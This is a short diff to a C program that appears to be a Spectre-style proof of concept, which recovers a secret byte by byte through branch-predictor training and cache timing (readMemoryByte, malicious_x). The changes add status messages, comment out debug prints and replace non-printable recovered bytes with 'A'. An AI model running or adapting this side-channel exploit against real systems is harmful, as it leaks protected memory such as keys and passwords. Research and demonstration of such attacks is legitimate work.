@@ -175,7 +175,7 @@ void readMemoryByte(size_t target_idx, uint8_t value[2], int score[2])
 
 int main()
 {
-
+	printf("Training branch predictor... \n");
     const char *secret = readimage();
     //printf("S=  %s", secret);
 
@@ -200,16 +200,24 @@ int main()
         attack[i] = true;
     }
 
-    printf("Reading %d bytes:\n", len);
+    //printf("Reading %d bytes:\n", len);
     char str[strlen(secret) * sizeof(double)];
-    printf("%lu", sizeof(str) / sizeof(double)); 
-
+    //printf("Size of %lu", sizeof(str) / sizeof(double)); 
+	printf("Retrieving cashe state...\n");
     while (--len >= 0)
     {
         // printf("Reading at malicious_x = %p... ", (void *)malicious_x);
         readMemoryByte(malicious_x++, value, score);
-        //strcat(str, value[0]);
+        
+        if (value[0] > 31 && value[0] < 127)
+        {
 		append(str, value[0]);
+	}else
+	{
+				uint8_t def[2] =  "A";
+		append(str,def[0]);
+	}
+
         // if (score[1] > 0)
         // {
         //     printf("(second best: 0x%02X score=%d)", value[1], score[1]);
